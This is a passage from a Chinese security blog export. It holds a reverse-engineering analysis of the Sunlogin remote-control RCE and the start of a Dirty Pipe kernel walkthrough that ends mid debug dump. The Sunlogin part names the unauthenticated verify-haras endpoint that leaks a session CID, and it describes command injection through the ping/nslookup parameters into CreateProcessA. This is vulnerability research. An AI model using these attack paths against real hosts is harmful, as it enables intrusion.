out\\debug_by_vs --args=&quot;is_component_build = true is_debug = true v8_optimized_debug = false&quot;\n\n最后找到gn_all，编译之，最终得到可执行文件。\n参考文章：https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/windows_build_instructions.md#Setting-up-Windows\nhttps://blog.csdn.net/HermitSun/article/details/106091018\nhttps://www.anquanke.com/post/id/253048\n"},{"title":"sunlogin rce分析","url":"/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/","content":"sunloginl rce漏洞分析首先分析二进制文件，拖入ida\n\n发现被加壳，die（detect it easy）查壳发现是upx，使用github官方的upx最新版脱壳即可\nupx -d xxx.exe\n\n注意最新的工具脱壳后无法直接执行，应该是upx在加壳的过程中将基址存在了某个寄存器或内存中，而脱壳过程中将这段代码删除了，导致无法找到对应的基址。\n但是可以拖入ida进行分析\n脱壳后拖入ida进行分析，脱壳后针对于SunloginClient_11.0.0.33162_X64文件关键函数偏移为0xE1D0DE，和start函数的offset为0x2DAFDE\n\nverify-haras功能点为本次出现敏感信息泄露的关键功能，下面根据补丁对比看下实际功能\n补丁对比查看补丁前和补丁后泄露CID的接口，其中sub_1400F0690函数用于http response\n补丁前\n\n\n\n\n补丁后将相关的功能点删除了\n\n\n信息泄露这里我将详细的调试以及跟踪过程都放入了文章，方便感兴趣的小伙伴自己调试复现，说不定会发现惊喜。\n由于脱壳后程序无法执行，所以笔者采用了带壳调试的方式，调试方式为首先运行待调试程序，然后找到开放端口的向日葵进程，之后attach入该进程即可调试。\n具体做法就是通过esp定律定位到oep，之后通过相对偏移在关键位置下断点，而带壳调试有两个比较麻烦的点，一是定位关键代码相对来说困难一些，二是无法观察函数调用栈，因为都是在壳函数中完成的所有操作。\n上面已经得出，我个人的SunloginClient_11.0.0.33162_X64文件\nlea     rdx, aVerifyHaras ; &quot;verify-haras&quot;\n\n偏移为0xE1D0DE，和start函数的offset为0x2DAFDE，所以根据偏移在动态调试时下硬件断点（软件断点无法跟入到该代码处，暂时不清楚原因），之后保持向日葵在运行状态，之后浏览器访问\nhttp://ip:port/cgi-bin/rpc?action=verify-haras\n\n程序将会断在上述指令处。\n\n之后单步执行，观察函数传入的参数，rcx与rdx均为verify-haras。\n\n之后调用了函数，返回值为&quot;dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3&quot;，暂时不清楚该字符串代表什么含义，也不清楚不同次的执行该字符串是否会变化\n \n之后调用函数将两个字符串拼接，查看返回值（也就是rax寄存器）证实了我们的猜想。这时我们可以解决刚刚的疑惑，也就是说第二个字符串就是CID（但是这里我们已经知道漏洞详情从而分析漏洞，如果没有知道漏洞详情，那么该漏洞的挖掘就是一门技术活了）。\n\n之后相应包中就带上了CID相关的信息\n这时候我们比较好奇，为什么要拼接这样的get请求来达到信息泄露的目的呢，通过ida查看该函数的交叉引用（下面对应的解释以及注释均为笔者根据调试自己的漏洞环境得出的结论，详细的调试过程就不贴出了）\n\n可以看到验证了cgi-bin/rpc的接口，向上查看，发现还有\n\nlogin.cgi\ncgi-bin/login.cgi\nexpress_login\ndesktop.list\ncloudconfig\ntransfer\nmicro-live/enable\ncheck\ngetfastcode\nassist\nprojection\ngetaddress\n\n在查找字符串的时候也发现了对应的注册，上面图片里面的逻辑其实就是449行对应的函数\n\n这时我们向下找，在该函数中，我们可以看到在处理action时，通过第266行获得了action的参数值并放入action_parameter变量中。\n\n接下来拿获取到的参数值与字符串verify-haras做对比，如果匹配，则进入if逻辑，很显然，我们构造的action的参数值就是verify-haras，进入if逻辑后，if里面的Src存放了http的响应包，这里第398行调用了函数来生成一串随机字符串，该随机字符串就是CID，最后将拼接后的Src返回给用户，即泄露了CID（注意这里的CID是每次请求都会变化的）。\n\n可以看下403行对应释放内存的逻辑，14行将原来索引到CID对应内存的指针的最后一位置为0，所以通过偏移是可能索引到被释放的内存的，有引发内存错误的风险，\n\n调试tips在字符串ida字符串搜索时看到了很多带有cgi-bin/rpc对应的关键字，比如\n\n比如\n\n还比如\n\n具体定位方式实际上就是给每个cgi-bin/rpc的位置处下断点，简单有效，实际上动态调试的目的也在于此，当某个变量的含义不确定或者判断某段代码是否会执行，或者调试exp时观察是否会执行对应逻辑都很有效果。\n还有需要注意的一点\n调试程序时如果出现派生进程以及多线程，一定要attach对应的漏洞进程，否则可能无法断在断点处。多线程调试时如果只关注某个功能点，可以将其他进程暂时挂起（比如这里的cgi-bin）.\nida_verify_haras:    140E1D0DE\nida_action：           140E1CC51\n1： 140594909        88 87D5\n2： 140595253        887e8b\n3： 140E2173E        4660\ndebug_verify_haras：    00007FF76698D0DE\n1： 7FF7 6610 4909\n2： 7FF7 6610 5253\n3： 7FF7 6699 173E        yes\n代码执行上面已经统计了开放的接口，直接找check对应的处理函数\n\n跟进246行，在处理cmd参数时，比对了两个参数值ping和nslookup\n\n而这两个参数值存在rce漏洞\nida_cmd_parameter：    140E1B905\n之后执行了167行的逻辑\n\n调用了CreateProcess执行了传入的命令\n\n调试可以明显观察到执行了CreateProcessA进程\n\n执行ReadFile后，将执行后的结果放入Buffer指向的内存中了。\n\n这时有一个问题，既然直接给ping或nslookup传递拼接的命令就可以执行任意代码，那为什么要在cookie中传入CID呢。cookie中的CID的作用是什么呢，我们在函数中没有看到对应的校验逻辑，下面的图就是执行代码的逻辑，可以看到只有v21是个类似于校验的值，但仔细分析发现，v21只可以判断参数名称是否为ping或nslookup。\n\n笔者在复现的时候走了些许弯路，尝试了寻找CID、cookie对应的字符串，发现没有在任何一处断点断下。\n这里有一个比较坑的一点在于：ida的shift+f12并不能发现所有注册的字符串，有些明显的字符串形式并没有被shift+f12统计到，所以我们在分析代码逻辑时不要过度依赖于shift+f12的功能（比如在查找cgi-bin/rpc字符串时，shift+f12就没有统计到关键代码位置）\n最后通过错误信息定位到CID校验点\n\n通过流量可以发现，当我们不传入CID时，response body返回了报错信息，这时我们通过这个报错信息到ida中查找\n\n\n将上面两个函数对应报错位置处下断点，很容易发现实际上是第二个函数做了校验\n下面是不断尝试所得到的数据=(\n\nida_verify_haras:    140E1D0DE        \nida_cid_1：            1409F5BF1        -42 74ED\nida_cid_2：            140204F9A        -C1 8144\nida_cid_3：            140112979        -D0 A765\nida_cid_4：            140E209B8        38DA\ndebug_verify_haras：    00007FF76698D0DE\ndebug_cid_1：            7FF7 6656 5BF1        -42 74ED\ndebug_cid_2：            7FF7 65D7 4F9A        -C1 8144\ndebug_cid_3：            7FF7 65C8 2979        -D0 A765\ndebug_cid_4：            7FF7 6699 09B8        38DA\nida_verify_haras:    140E1D0DE\nida_cookie_1：            140204F3F        -C1 819F\nida_cookie_2：            14057F7D8        -89 D906\nida_cookie_3：            1409F4A60        -42 867E\nida_cookie_4：            140111141         -D0 BF9D\nida_cookie_5：            14014D5AA        -CC FB34\ndebug_verify_haras：    00007FF7142ED0DE\ndebug_cookie_1：            7FF7 136D 4F3F\ndebug_cookie_2：            7FF7 13A4 F7D8\ndebug_cookie_3：            7FF7 13EC 4A60\ndebug_cookie_4：            7FF7 135E 1141\ndebug_cookie_5：            7FF7 1361 D5AA\nida_verify_haras:    140E1D0DE\nida_verification_failture_1:        14020528F            C1 7E4F\nida_verification_failture_2:        140E13659            9A85\ndebug_verify_haras：    00007FF7142ED0DE\ndebug_verification_failture_1:        7FF7 136D 528F\ndebug_verification_failture_2:        7FF7 142E 3659        yes\n\n最终定位到了在该位置处做了校验，如果CID检验失败，则返回红框中的报错信息\n\n校验逻辑的反汇编代码如下，通过计算相对便宜即可在ida中定位到，具体的校验逻辑感兴趣的小伙伴可以进行分析\n\n00007FF7142ED0DE\n00007FF7142D6470        1 6C6E\n\n\n漏洞挖掘tipsCreateProcessA等危险函数\n暴露的多个接口\n关键session（如CID）的信息泄露\n参考链接https://www.cnblogs.com/zUotTe0/p/15913108.html\n"},{"url":"/2022/03/29/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"\n前言CVE-2022-0847 于 2022-03-07 公开披露，该漏洞的大概原理为splice系统调用由于未初始化某buf，可能包含旧的PIPE_BUF_FLAG_CAN_MERGE，导致可以通过管道越界写，覆盖关键文件如/etc/passwd可达到提权的效果。因漏洞类型和“DirtyCow”（脏牛）类似，发现者 Max Kellermann 研究员将该漏洞命名为 Dirty Pipe\n从漏洞作者的博客可以得知，作者并非从事于漏洞挖掘相关的工作，而是由于关注到了日志文件的CRC校验和与文件大小标志位出现了错误。大小正好为8个字节，作者经过长时间的排查验证发现这八个字节为ZIP头。\n\n经过检查zlib及项目相关库-&gt;发现bug出现在月末-&gt;审查web代码-&gt;定位linux内核代码这一套复杂的流程发现了linux pipe存在安全隐患，最终编写出利用代码并提交给社区。这种精神是安全研究者必备的品质。respect！\n参考了国内的师傅们所公开的分析文章，大概了解漏洞原理后，开始正式分析。\n前置知识非必须，实力较强的师傅可以直接看漏洞分析部分。\n前置知识一、linux内核调试环境编译主要参考了该文章与该文章，我使用了5.11.1版本的linux\n1、源码获取首先拖源码（这里也可以下载其他版本）\nwget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.11.1.tar.gztar zxvf linux-5.11.1.tar.gz\n\n或者使用官方github\ngit clone https://github.com/torvalds/linux.gitgit checkout xxxx\n\n我采用的是第一种方式\n2、内核编译cd linux-5.11.1make x86_64_defconfig\t\t   # 加载默认configmake menuconfig\t\t# 自定义config\n\n要进行打断点调试，需要关闭系统的随机化和开启调试信息：\nProcessor type and features  ---&gt;     [ ] Build a relocatable kernel                                                       [ ]  Randomize the address of the kernel image (KASLR) (NEW) Kernel hacking  ---&gt;    Compile-time checks and compiler options  ---&gt;          [*] Compile the kernel with debug info                                                                          [ ]   Reduce debugging information                                                                              [ ]   Produce split debuginfo in .dwo files                                                                     [*]   Generate dwarf4 debuginfo                                                 [*]   Provide GDB scripts for kernel debugging\n\n之后进行编译\nmake -j8\n\n\n\n3、加载文件系统镜像这里可以使用syzkaller的生成脚本\ncd linux-5.11.1sudo apt-get install debootstrapwget https://github.com/google/syzkaller/blob/master/tools/create-image.sh -O create-image.sh\t# 这里我得到的是一个html页面，最终笔者自行访问页面复制了相关的代码。chmod +x create-image.sh./create-image.sh\t\t\t\t# 这里会在当前目录生成 stretch.img\n\n\n\n4、启动qemu这里的-nographic以及-s一定要加，执行命令后会启动生成的linux系统，并得到一个shell，这里可以不指定-net参数，默认会有一个NAT的网络，可以访问外网。\ncd linux-5.11.1sudo qemu-system-x86_64 \\\t-s \\    -m 2G \\    -smp 2 \\    -kernel ./arch/x86/boot/bzImage \\    -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial&quot;\\    -drive file=./stretch.img,format=raw \\    -nographic \\    -pidfile vm.pid \\    2&gt;&amp;1 | tee vm.log\n\n\n命令行参数如下\n-s              shorthand for -gdb tcp::1234-append cmdline use &#x27;cmdline&#x27; as kernel command line-net nic[,macaddr=mac][,model=type][,name=str][,addr=str][,vectors=v]                configure or create an on-board (or machine default) NIC and                connect it to hub 0 (please use -nic unless you need a hub) -enable-kvm 开启kvm，这里不要加，否则调试时会直接跳转到__sysvec_apic_timer_interrupt\n\n\n\n5、gdb调试cd linux-5.11.1gdb vmlinuxgef➤  target remote:1234\t\t# 连接到远程调试接口# 后面就可以正常进行调试了\n\n\n二、标准输入输出、输入输出重定向、管道1、标准输入输出执行一个shell命令行时通常会自动打开三个标准文件，即标准输入文件stdin，通常对应终端的键盘；标准输出文件stdout和标准错误输出文件stderr，这两个文件都对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出数据输出]到标准输出文件，而将错误信息送到标准错误文件中。\n举两个栗子\n这里的文件描述符要注意里面的信息流\n// test1.c\t将AAAAA送入标准输出，标准输出通过管道传递给wc命令得到字符数#include&lt;unistd.h&gt;int main() &#123;        write(1,&quot;AAAAA&quot;,5);&#125;// ./test1AAAAA// ./test1 | wc -c5    // test2.c 将AAAAA送入标准输入，wc -c没有从标准输出得到输入#include&lt;unistd.h&gt;int main() &#123;        write(0,&quot;AAAAA&quot;,5);&#125;// ./test1AAAAA// ./test1 | wc -cAAAAA0\n\n\n\n2、输入输出重定向输入重定向是指把命令（或可执行程序）的标准输入重定向到指定的文件中。也就是说，输入可以不来自键盘，而来自一个指定的文件。\n如果给出一个文件名作为wc命令的参数，如下例所示，wc将返回该文件所包含的行数、单词数和字符数。\n# wc /etc/passwd  50   87 2933 /etc/passwd\n\n另一种把/etc/passwd文件内容传给wc命令的方法是重定向wc的输入。输入重定向的一般形式为：命令&lt;文件名。可以用下面的命令把wc命令的输入重定向为/etc/passwd文件：\n# wc &lt; /etc/passwd  50   87 2933\n\n另一种输入重定向称为here文档，它告诉shell当前命令的标准输入来自命令行。here文档的重定向操作符使用&lt;&lt;。它将一对分隔符（本例中用delim表示）之间的正文重定向输入给命令。下例将一对分隔符delim之间的正文作为wc命令的输入，统计出正文的行数、单词数和字符数。\n# wc &lt;&lt; delim\\&gt;this text forms the content\\&gt;of the here document,which\\&gt;continues until the end of\\&gt;text delimter\\&gt;delim4 17 98\n\n输出重定向是指把命令（或可执行程序）的标准输出或标准错误输出重新定向到指定文件中。这样，该命令的输出就不显示在屏幕上，而是写入到指定文件中。\n输出重定向比输入重定向更常用，很多情况下都可以使用这种功能。例如，如果某个命令的输出很多，在屏幕上不能完全显示，那么将输出重定向到一个文件中，然后再用文本编辑器打开这个文件，就可以查看输出信息；如果想保存一个命令的输出，也可以使用这种方法。\n输出重定向的一般形式为：命令&gt;文件名。例如：\nls &gt; out\n\n这里将ls命令的输出写入到out文件中，注意这里的写入是覆盖写入，如果想得到追加写入的效果，可以使用&lt;&lt;.\nls &gt;&gt; out\n\n和程序的标准输出重定向一样，程序的错误输出也可以重新定向。使用符号2&gt;（或追加符号2&gt;&gt;）表示对错误输出设备重定向。例如下面的命令：\nls 2&gt; errorls 2&gt;&gt; error\n\n可在屏幕上看到程序的正常输出结果，但又将程序的任何错误信息送到文件err.file中，以备将来检查用。\n还可以使用另一个输出重定向操作符（&amp;&gt;）将标准输出和错误输出同时送到同一文件中。例如：\nls &amp;&gt; error\n\n利用重定向将命令组合在一起，可实现系统单个命令不能提供的新功能。例如使用下面的命令序列：\n# ls /usr/bin &gt; /tmp/dir# wc -w &lt; /tmp/dir459\n\n统计了/usr/bin目录下的文件个数。\n3、管道将一个程序或命令的输出作为另一个程序或命令的输入，有两种方法，一种是通过一个临时文件将两个命令或程序结合在一起，例如上个例子中的/tmp/dir文件将ls和wc命令联在一起；另一种是Linux所提供的管道功能。这种方法比前一种方法更好。\n管道可以把一系列命令连接起来，这意味着第一个命令的输出会作为第二个命令的输入通过管道传给第二个命令，第二个命令的输出又会作为第三个命令的输入，以此类推。显示在屏幕上的是管道行中最后一个命令的输出（如果命令行中未使用输出重定向）。\n通过使用管道符“|”来建立一个管道行。用管道重写上面的例子：\n# ls /usr/bin|wc -w1789\n\n管道与重定向的简单区别在于，重定向将命令与文件连接起来，而管道符将命令与命令连接起来。\n管道是进程间通信的主要手段之一。一个管道实际上就是个只存在于内存中的文件，\n对这个文件的操作要通过两个已经打开文件进行，它们分别代表管道的两端。管道是一种特殊的文件，它不属于某一种文件系统，而是一种独立的文件系统，有其自己的数据结构。根据管道的适用范围将其分为：无名管道和命名管道。\n管道是由内核管理的一个缓冲区，相当于我们放入内存中的一个纸条。管道的一端连接一个进程的输出。这个进程会向管道中放入信息。管道的另一端连接一个进程的输入，这个进程取出被放入管道的信息。一个缓冲区不需要很大一般为4K大小，它被设计成为环形的数据结构，以便管道可以被循环利用。当管道中没有信息的话，从管道中读取的进程会等待，直到另一端的进程放入信息。当管道被放满信息的时候，尝试放入信息的进程会等待，直到另一端的进程取出信息。当两个进程都终结的时候，管道也自动消失。\n三、管道源代码实现0、前言代码部分使用了linux v5.11.1内核代码，也尝试对比了下linux0.12内核的源代码，发现内部的结构体与代码逻辑已完全不同，0.12使用了名叫m_inode的结构体，而5.11.1则使用了pipe_inode_info的结构体，光pipe.c文件的体量，linux0.12为128行，而5.11.1为1431行，差了11倍的代码量，综合多方面考虑，linux0.12的代码对于现在linux内核运作的理解并不具备太大的参考价值。\n代码有一部分的变量值是我通过poc实时得出的，并不适用于所有情况。\n下面的代码分析章节编写顺序是按照调用关系来写的（比如函数A调用了函数B，编写时先写A再写B），然而分析顺序与编写顺序恰好相反（也就是先分析B再分析A），原因是在源码分析时，很明显要线分析最内层的函数，这样才能更好理解外层函数的作用，所以有些代码分析大家可能不能理解，往下看就好了。\n笔者先将整体的流程图贴出来，方便师傅们对函数调用流程有个整体的把握。\n\n创建pipe的流程首先创建两个整数类型的文件描述符\nint fd[2];\n\n之后利用pipe函数传入文件描述符即可打开管道，其中fd[0]为读管道的文件描述符，fd[1]为写管道的文件描述符。\nint err = pipe(fd); \n\n一个简单的demo如下，代码主要的逻辑是：首先创建一个管道，之后通过write函数操作fd[1]向管道写入了数据，之后通过read函数操作fd[0]从管道读出数据到标准输出。\n#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc,char* argv[])&#123;        pid_t pid;        int fd[2];//定义管道的读、写端文件描述符        int len, err;        char* str = &quot;hello pipe\\n&quot;;//指定写数据        char buf[1024];//定义接收缓冲区        err = pipe(fd);//调用pipe()函数就已将管道打开        if(err == -1) &#123;                perror(&quot;pipe error&quot;);                exit(1);        &#125;        pid = fork();        if(pid &gt; 0)/* 父进程 */ &#123;                close(fd[0]);                write(fd[1],str,strlen(str));//写到管道中                close(fd[1]);        &#125;        else if(pid == 0)/* 子进程 */ &#123;                close(fd[1]);                len = read(fd[0],buf,sizeof(buf));//从管道中的读，返回读到的字节数                write(STDOUT_FILENO,buf,len);//写到标准输出                close(fd[0]);        &#125;        return 0;&#125;\n\n\n\n1、pipe() 与 pipe2()创建 pipe 的系统调用有两个：pipe() 和 pipe2()，实现如下，二者均调用了do_pipe2函数，\nSYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)&#123;\treturn do_pipe2(fildes, flags);&#125;SYSCALL_DEFINE1(pipe, int __user *, fildes)&#123;\treturn do_pipe2(fildes, 0);&#125;\n\n2、do_pipe2函数通过 __do_pipe_flags 创建了两个 fd 和两个 file，并通过fd_install 将其一一绑定。\n/* * sys_pipe() is the normal C calling standard for creating * a pipe. It&#x27;s not the way Unix traditionally does this, though. */static int do_pipe2(int __user *fildes, int flags)&#123;\tstruct file *files[2];\tint fd[2];\tint error;\terror = __do_pipe_flags(fd, files, flags);\t\t// 进入该函数\tif (!error) &#123;\t\tif (unlikely(copy_to_user(fildes, fd, sizeof(fd)))) &#123;\t\t\tfput(files[0]);\t\t\tfput(files[1]);\t\t\tput_unused_fd(fd[0]);\t\t\tput_unused_fd(fd[1]);\t\t\terror = -EFAULT;\t\t&#125; else &#123;\t\t\tfd_install(fd[0], files[0]);\t\t// fd_install ：在 fd 数组中安装一个文件指针 rcu_assign_pointer(fdt-&gt;fd[fd], file);\t\t\tfd_install(fd[1], files[1]);\t\t&#125;\t&#125;\treturn error;&#125;\n\n3、__do_pipe_flags查看__do_pipe_flags，第一个参数 fd 用于保存创建的两个文件描述符，第二个参数用于保存创建的两个 struct file 结构体实例，第三个参数是系统调用参数 flags 的值。\n该函数被do_pipe2调用，创建了两个 files 结构，并初始化了两个文件描述符 fd。\nstatic int __do_pipe_flags(int *fd, struct file **files, int flags)&#123;\tint error;\tint fdw, fdr;\tif (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))\t\treturn -EINVAL;\terror = create_pipe_files(files, flags);\t\t\t// 在调试时很奇怪的直接跳转到 get_pipe_inode 函数中了\tif (error)\t\treturn error;\terror = get_unused_fd_flags(flags);\t\t\t\t// 获取读的文件描述符\tif (error &lt; 0)\t\tgoto err_read_pipe;\tfdr = error;\terror = get_unused_fd_flags(flags);\t\t\t\t// 获取写的文件描述符\tif (error &lt; 0)\t\tgoto err_fdr;\tfdw = error;\taudit_fd_pair(fdr, fdw);\t\t\t\t\t\t\t\t// 这里对两个文件描述符进行审计\tfd[0] = fdr;\tfd[1] = fdw;\treturn 0; err_fdr:\tput_unused_fd(fdr); err_read_pipe:\tfput(files[0]);\tfput(files[1]);\treturn error;&#125;\n\n4、create_pipe_files该函数被__do_pipe_flags调用，传入了file结构体指针类型的 res对象，并通过传入的 flag标志位生成两个 file 类型的对象，之后将 res[0] 与 res[1] 分别指向这两个对象。\n该函数的大体逻辑为：首先通过 get_pipe_inode 新创建一个inode 对象，之后通过 alloc_file_pseudo 创建一个 file 对象，之后通过 alloc_file_clone 克隆刚刚生成的 file 对象，之后将两个file 对象的 private_data 成员设置为 inode-&gt;i_pipe ，而这个 inode-&gt;i_pipe 就是下面介绍的 alloc_pipe_info 生成的对象。最后调用 stream_open 将res[0] 与 res[1] 分别传入，打开两个文件流，具体 inode 在 stream_open 中起到的作用不清楚。\nint create_pipe_files(struct file **res, int flags)&#123;\tstruct inode *inode = get_pipe_inode();\t\t\t\t// 创建一个 inode 对象。\tstruct file *f;\tint error;\tif (!inode)\t\treturn -ENFILE;\tif (flags &amp; O_NOTIFICATION_PIPE) &#123;\t\t\t// #define O_NOTIFICATION_PIPE\tO_EXCL\t/* Parameter to pipe2() selecting notification pipe */\t\terror = watch_queue_init(inode-&gt;i_pipe);\t\tif (error) &#123;\t\t\tfree_pipe_info(inode-&gt;i_pipe);\t\t\tiput(inode);\t\t\treturn error;\t\t&#125;\t&#125;\tf = alloc_file_pseudo(inode, pipe_mnt, &quot;&quot;,\t\t\t\t\t\t\t\t\tO_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),\t\t\t\t&amp;pipefifo_fops);\t\t\t// 分配了struct file的堆空间，调用了 alloc_file 函数，经过多次套娃，发现最终调用的是 kmem_cache_alloc 函数。可见随着累年的发展，linux 中间接口也在不断的增加。\tif (IS_ERR(f)) &#123;\t\t\t\t\t\t// 这里如果 f 分配失败则会释放之前申请的 pipe_buffer，并减少 inode 的引用计数，iput 的作用是减少 inode 的引用计数\t\tfree_pipe_info(inode-&gt;i_pipe);\t\tiput(inode);\t\treturn PTR_ERR(f);\t&#125;\tf-&gt;private_data = inode-&gt;i_pipe;\t\t// 这里将\tpipe_buffer 赋值给 f-&gt;private_data\tres[0] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),\t\t\t\t\t  &amp;pipefifo_fops);\t\t\t\t// 拷贝一份之前生成的 f 的对象\tif (IS_ERR(res[0])) &#123;\t\tput_pipe_info(inode, inode-&gt;i_pipe);\t\t\tfput(f);\t\treturn PTR_ERR(res[0]);\t&#125;\tres[0]-&gt;private_data = inode-&gt;i_pipe;\tres[1] = f;\tstream_open(inode, res[0]);\t\t\t\t\t\t// 看了下源码，代码中没用到 inode ，不知道有什么用\tstream_open(inode, res[1]);\treturn 0;&#125;\n\n下面是 stream_open 的源码\n/* * stream_open is used by subsystems that want stream-like file descriptors. * Such file descriptors are not seekable and don&#x27;t have notion of position * (file.f_pos is always 0 and ppos passed to .read()/.write() is always NULL). * Contrary to file descriptors of other regular files, .read() and .write() * can run simultaneously. * * stream_open never fails and is marked to return int so that it could be * directly used as file_operations.open . */int stream_open(struct inode *inode, struct file *filp)&#123;\tfilp-&gt;f_mode &amp;= ~(FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE | FMODE_ATOMIC_POS);\tfilp-&gt;f_mode |= FMODE_STREAM;\treturn 0;&#125;\n\n\n\n5、get_pipe_inode()该函数被create_pipe_files调用，用于生成一个inode，且该inode只用于管道。\n该函数的大体逻辑为：首先通过 new_inode_pseudo 新创建一个inode 对象，之后通过 alloc_pipe_info 创建一个 pipe 对象，之后inode-&gt;i_pipe = pipe。函数的后面初始化inode 对象的其他属性，并进行一系列异常处理。\nstatic struct inode * get_pipe_inode(void)&#123;\tstruct inode *inode = new_inode_pseudo(pipe_mnt-&gt;mnt_sb);\t\t\t// 获取一个 inode 。 为给定的 superblock 分配一个新的 inode。 inode 不会被链接到 superblock s_inodes 列表中。这意味着 fs 不能卸载，quotas, fsnotify, writeback 均不能工作。 // mnt_sb 是指向 superblock 的指针。\tstruct pipe_inode_info *pipe;\tif (!inode)\t\tgoto fail_inode;\tinode-&gt;i_ino = get_next_ino();\t\t// /* ino:  Stat data, not accessed from path walking */\t\t\tpipe = alloc_pipe_info();\t\t\t// 见 8\tif (!pipe)\t\tgoto fail_iput;\tinode-&gt;i_pipe = pipe;\t\t\t// 从这到下面都是给inode进行初始化了    /*    \t实际上inode-&gt;i_pipe 是个联合体成员，它不一定是 i_pipe，而一旦是i_pipe，则代表该inode只用于管道，inode 实际上相当于一个常用的数据结构，inode 常常用于 mostly read-only and often accessed 的数据结构。    \tunion &#123;\t\tstruct pipe_inode_info\t*i_pipe;\t\tstruct cdev\t\t*i_cdev;\t\tchar\t\t\t*i_link;\t\tunsigned\t\ti_dir_seq;\t&#125;;    */\tpipe-&gt;files = 2;\tpipe-&gt;readers = pipe-&gt;writers = 1;\tinode-&gt;i_fop = &amp;pipefifo_fops;\t\t\t// 见9\t/*\t * Mark the inode dirty from the very beginning,\t * that way it will never be moved to the dirty\t * list because &quot;mark_inode_dirty()&quot; will think\t * that it already _is_ on the dirty list.\t */\tinode-&gt;i_state = I_DIRTY;\tinode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;\tinode-&gt;i_uid = current_fsuid();\tinode-&gt;i_gid = current_fsgid();\tinode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);\treturn inode;fail_iput:\tiput(inode);fail_inode:\treturn NULL;&#125;/* 下面是该函数返回值，也就是inode，实际上inode我们不需要太过关心gef➤  print *inode$7 = &#123;  i_mode = 0x1180,  i_opflags = 0x0,  i_uid = &#123;    val = 0x3e8  &#125;,  i_gid = &#123;    val = 0x3e8  &#125;,  i_flags = 0x0,  i_acl = 0xffffffffffffffff,  i_default_acl = 0xffffffffffffffff,  i_op = 0xffffffff8201a280 &lt;empty_iops&gt;,  i_sb = 0xffff888003057800,  i_mapping = 0xffff888005315128,  i_security = 0xffff88800643db60,  i_ino = 0x293f,  &#123;    i_nlink = 0x1,    __i_nlink = 0x1  &#125;,  i_rdev = 0x0,  i_size = 0x0,  i_atime = &#123;    tv_sec = 0x62340101,    tv_nsec = 0x1161f975  &#125;,  i_mtime = &#123;    tv_sec = 0x62340101,    tv_nsec = 0x1161f975  &#125;,  i_ctime = &#123;    tv_sec = 0x62340101,    tv_nsec = 0x1161f975  &#125;,  i_lock = &#123;    &#123;      rlock = &#123;        raw_lock = &#123;          &#123;            val = &#123;              counter = 0x0            &#125;,            &#123;              locked = 0x0,              pending = 0x0            &#125;,            &#123;              locked_pending = 0x0,              tail = 0x0            &#125;          &#125;        &#125;      &#125;    &#125;  &#125;,  i_bytes = 0x0,  i_blkbits = 0xc,  i_write_hint = 0x0,  i_blocks = 0x0,  i_state = 0x7,  i_rwsem = &#123;    count = &#123;      counter = 0x0    &#125;,    owner = &#123;      counter = 0x0    &#125;,    osq = &#123;      tail = &#123;        counter = 0x0      &#125;    &#125;,    wait_lock = &#123;      raw_lock = &#123;        &#123;          val = &#123;            counter = 0x0          &#125;,          &#123;            locked = 0x0,            pending = 0x0          &#125;,          &#123;            locked_pending = 0x0,            tail = 0x0          &#125;        &#125;      &#125;    &#125;,    wait_list = &#123;      next = 0xffff888005315078,      prev = 0xffff888005315078    &#125;  &#125;,  dirtied_when = 0x0,  dirtied_time_when = 0x0,  i_hash = &#123;    next = 0xffff8880052ce9d8,    pprev = 0x0 &lt;fixed_percpu_data&gt;  &#125;,  i_io_list = &#123;    next = 0xffff8880053150a8,    prev = 0xffff8880053150a8  &#125;,  i_lru = &#123;    next = 0xffff8880053150b8,    prev = 0xffff8880053150b8  &#125;,  i_sb_list = &#123;    next = 0xffff8880053150c8,    prev = 0xffff8880053150c8  &#125;,  i_wb_list = &#123;    next = 0xffff8880053150d8,    prev = 0xffff8880053150d8  &#125;,  &#123;    i_dentry = &#123;      first = 0x0 &lt;fixed_percpu_data&gt;    &#125;,    i_rcu = &#123;      next = 0x0 &lt;fixed_percpu_data&gt;,      func = 0x0 &lt;fixed_percpu_data&gt;    &#125;  &#125;,  i_version = &#123;    counter = 0x0  &#125;,  i_sequence = &#123;    counter = 0x0  &#125;,  i_count = &#123;    counter = 0x1  &#125;,  i_dio_count = &#123;    counter = 0x0  &#125;,  i_writecount = &#123;    counter = 0x0  &#125;,  i_readcount = &#123;    counter = 0x0  &#125;,  &#123;    i_fop = 0xffffffff82019e20 &lt;pipefifo_fops&gt;,    free_inode = 0xffffffff82019e20 &lt;pipefifo_fops&gt;  &#125;,  i_flctx = 0x0 &lt;fixed_percpu_data&gt;,  i_data = &#123;    host = 0xffff888005314fc0,    i_pages = &#123;      xa_lock = &#123;        &#123;          rlock = &#123;            raw_lock = &#123;              &#123;                val = &#123;                  counter = 0x0                &#125;,                &#123;                  locked = 0x0,                  pending = 0x0                &#125;,                &#123;                  locked_pending = 0x0,                  tail = 0x0                &#125;              &#125;            &#125;          &#125;        &#125;      &#125;,      xa_flags = 0x21,      xa_head = 0x0 &lt;fixed_percpu_data&gt;    &#125;,    gfp_mask = 0x100cca,    i_mmap_writable = &#123;      counter = 0x0    &#125;,    i_mmap = &#123;      rb_root = &#123;        rb_node = 0x0 &lt;fixed_percpu_data&gt;      &#125;,      rb_leftmost = 0x0 &lt;fixed_percpu_data&gt;    &#125;,    i_mmap_rwsem = &#123;      count = &#123;        counter = 0x0      &#125;,      owner = 